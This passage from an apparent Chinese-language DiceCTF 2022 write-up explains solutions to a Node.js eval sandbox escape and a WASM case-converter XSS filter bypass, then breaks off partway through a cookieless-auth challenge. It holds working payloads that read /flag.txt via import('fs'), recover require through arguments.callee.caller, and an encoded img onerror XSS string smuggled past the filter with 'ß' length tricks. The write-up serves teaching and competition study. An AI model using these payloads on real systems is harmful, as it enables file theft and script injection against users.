    <span class="token keyword">let</span> __proto__<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> hasOwnProperty<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> isPrototypeOf<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> propertyIsEnumerable<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> toLocaleString<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> toString<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> valueOf<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>你可以執行任何程式碼，但是在幾乎所有東西都變成 <code>undefined</code> 的情況下，你還能做什麼呢？</p>
<p>當初在看這題的時候我也沒有想到該怎麼辦，我試了幾個預設會有的東西像是 <code>module</code>、<code>exports</code> 之類的，都拿到 <code>undefined</code>，想說試試看用 <code>import</code>，結果噴了錯誤：<code>SyntaxError: Cannot use import statement outside a module</code>。</p>
<p>根據<a target="_blank" rel="noopener" href="https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#miscundefined">作者的 writeup</a>，這題有兩個解。</p>
<p>第一個解就是雖然 <code>import &quot;fs&quot;</code> 行不通，但是 <code>import(&#39;fs&#39;)</code> 可以，我看了一下 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/import">MDN</a>，上面寫說：「There is also a function-like dynamic import(), which does not require scripts of type&#x3D;”module”.」</p>
<p>所以可以這樣解：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">m</span><span class="token operator">=></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>另外一個解法則是要知道 Node.js 的一些<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050">細節</a>，例如說你寫這樣一段程式碼：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Trying to reach"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"dead code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因為沒有 function，所以你預期 return 應該會出錯，但執行時你會發現沒有出錯，而且還真的像是有個 function 一樣。這是因為 Node.js 的 module 其實都會被放到 function 裡面，上面的程式碼會像這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">exports<span class="token punctuation">,</span> require<span class="token punctuation">,</span> module<span class="token punctuation">,</span> __filename<span class="token punctuation">,</span> __dirname</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Trying to reach"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"dead code"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我們的目標就是拿到 <code>require</code> 這個參數，但是因為 <code>arguments</code> 也變成 <code>undefined</code> 了，所以沒有辦法直接拿到，要間接去拿。這是什麼意思呢，我們可以先執行一個 function，然後再用 <code>arguments.callee.caller.arguments</code> 去拿到 parent function 的參數，像是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">
<span class="token keyword">function</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token keyword">null</span>
    <span class="token keyword">let</span> arguments <span class="token operator">=</span> <span class="token keyword">null</span>
    <span class="token keyword">function</span> <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee <span class="token operator">===</span> inner<span class="token punctuation">)</span> <span class="token comment">// true</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller <span class="token operator">===</span> wrapper<span class="token punctuation">)</span> <span class="token comment">// true</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">.</span>callee<span class="token punctuation">.</span>caller<span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// I am flag</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token string">'I am flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這題我自己比較可惜的點有兩個，一個是以前就有學生問過我那個 return 的問題，我當時只有回說外面包了一層 function，但沒有銘記在心中（？），導致完全忘記。</p>
<p>第二個是 <code>arguments.callee.caller</code> 這個操作我自己在兩年前就寫過：<a href="https://blog.huli.tw/2020/04/18/javascript-function-is-awesome/">覺得 JavaScript function 很有趣的我是不是很奇怪</a>。</p>
<p>2022-02-09 補充：</p>
<p>補充一下另一個我覺得很帥氣的解法，來自這邊：<a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#undefined">DiceCTF 2022 WriteUps by maple3142</a></p>
<p>這邊用了 Node.js 可以拿到 structuredStackTrace 的 feature，簡單的 POC 長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">CustomError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> oldStackTrace <span class="token operator">=</span> Error<span class="token punctuation">.</span>prepareStackTrace
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    Error<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> structuredStackTrace</span><span class="token punctuation">)</span> <span class="token operator">=></span> structuredStackTrace
    Error<span class="token punctuation">.</span><span class="token function">captureStackTrace</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>stack
  <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
    Error<span class="token punctuation">.</span>prepareStackTrace <span class="token operator">=</span> oldStackTrace
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomError</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> x <span class="token keyword">of</span> err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我們可以用 <code>x.getFunction()</code> 拿到上層的 function，就是 Node.js 幫忙加上 wrapper 的那個，再一樣用 <code>arugments</code> 去拿到參數，官方有個文件在講 <a target="_blank" rel="noopener" href="https://v8.dev/docs/stack-trace-api">Stack trace API</a>。</p>
<p>然後還有一點我覺得很酷，就是上面 POC 中如果放到 undefined 這題，我們是沒有 <code>Error</code> 可以用的，那怎麼辦呢？</p>
<p>writeup 的作者用了這招：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	TypeError <span class="token operator">=</span> e<span class="token punctuation">.</span>constructor
<span class="token punctuation">&#125;</span>
Error <span class="token operator">=</span> <span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>沒錯啊！既然拿不到 Error，就先自己製造一個 TypeError，再利用 TypeError 是繼承自 Error 的特性，就可以不依靠 global 拿到 Error constructor 了，這招好帥。</p>
<h2><span id="webx2fblazingfast75-solves">web&#x2F;blazingfast(75 solves)</span></h2><p>這題的敘述是：</p>
<blockquote>
<p>I made a blazing fast MoCkInG CaSe converter!</p>
</blockquote>
<p>簡單來說就是寫了一個會把奇數位置的字轉成大寫的轉換器，主要程式碼如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> blazingfast <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">mock</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	blazingfast<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'Too long!'</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> str<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">'Nice try.'</span><span class="token punctuation">;</span>
		blazingfast<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>blazingfast<span class="token punctuation">.</span><span class="token function">mock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token string">'No XSS for you!'</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">let</span> mocking <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> buf <span class="token operator">=</span> blazingfast<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">while</span><span class="token punctuation">(</span>buf <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			mocking <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
			buf <span class="token operator">=</span> blazingfast<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		<span class="token keyword">return</span> mocking<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token function">mock</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

WebAssembly<span class="token punctuation">.</span><span class="token function">instantiateStreaming</span><span class="token punctuation">(</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/blazingfast.wasm'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> instance <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>	
	blazingfast <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>

	document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo-submit'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
		<span class="token function">demo</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">let</span> query <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> query<span class="token punctuation">;</span>
		<span class="token function">demo</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而 blazingfast.c 程式碼如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> length<span class="token punctuation">,</span> ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  length <span class="token operator">=</span> size<span class="token punctuation">;</span>
  ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">char</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> buf<span class="token punctuation">[</span>ptr<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  buf<span class="token punctuation">[</span>ptr<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">mock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">32</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'&lt;'</span> <span class="token operator">||</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'>'</span> <span class="token operator">||</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'&amp;'</span> <span class="token operator">||</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'"'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只要 buf 裡面的內容有 <code>&lt;</code> 跟 <code>&gt;</code> 就會直接 return 1，然後 JS 那層就會回傳 <code>No XSS for you!</code>，所以無法輕易執行 XSS。</p>
<p>這題的關鍵我有找到，但是當時程式碼沒看清楚導致想錯了，可惜沒解出來。</p>
<p>關鍵就是利用一些奇特的字元創造出長度的差異，例如說 <code>ß</code> 這個字元長度是 1，但是轉成大寫之後變成兩個字：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'ß'</span><span class="token punctuation">.</span>length <span class="token comment">// 1</span>
<span class="token string">'ß'</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token comment">// 2，變成 SS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>還有其他字元也有這種特性，可以自己 fuzzing 一下，有些字元拿來繞過長度限制很好用，像是這篇：<a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html">Exploiting XSS with 20 characters limitation</a> 就利用這招縮短長度，網址也可以用同樣的手法，可參考：<a target="_blank" rel="noopener" href="https://github.com/splitline/domain-obfuscator">domain-obfuscator</a> 或是 <a target="_blank" rel="noopener" href="https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names">Unicode Mapping on Domain names</a></p>
<p>假設我有個字串是 <code>ßßßßßßßß&lt;b&gt;1&lt;/b&gt;</code>，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 <code>8*2+8</code> &#x3D; 24 個字，所以 24 個字會全部被寫進去 buf 裡面。</p>
<p>在 <code>mock</code> 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 <code>&lt;&gt;</code> 這些字元進去，像這樣：</p>
<p><img src="/img/dicectf2022/p1.png"></p>
<p>但因為所有字元都會變成大寫，所以要找一個變成大寫之後還是可以用的 XSS payload，這時候可以用 encode 過的字串，像這樣：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;x onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如此一來就搞定了，或是也可以參考更複雜的做法：<a target="_blank" rel="noopener" href="https://smitop.com/p/dctf22-blazingfast/">https://smitop.com/p/dctf22-blazingfast/</a></p>
<h2><span id="webx2fno-cookies5-solves">web&#x2F;no-cookies(5 solves)</span></h2><p>這一題很有趣，敘述是：</p>
<blockquote>
<p>I found a more secure way to authenticate users. No cookies, no problems!</p>
</blockquote>
<p>簡單來說就是有個網站，無論做什麼操作都會先問你帳號密碼，打 API 也會直接把帳號密碼帶上去，如此一來就不需要 cookie 了。</p>
<p>這題前端的程式碼如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token function-variable function">validate</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[^$']+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>text <span class="token operator">??</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> <span class="token function-variable function">promptValid</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">validate</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">?</span> result <span class="token operator">:</span> <span class="token function">promptValid</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Username:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">promptValid</span><span class="token punctuation">(</span><span class="token string">'Password:'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> note<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> views <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/view'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        username<span class="token punctuation">,</span>
        password<span class="token punctuation">,</span>
        <span class="token literal-property property">id</span><span class="token operator">:</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>note<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Invalid username, password, or note id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> text <span class="token operator">=</span> note<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>mode <span class="token operator">===</span> <span class="token string">'markdown'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
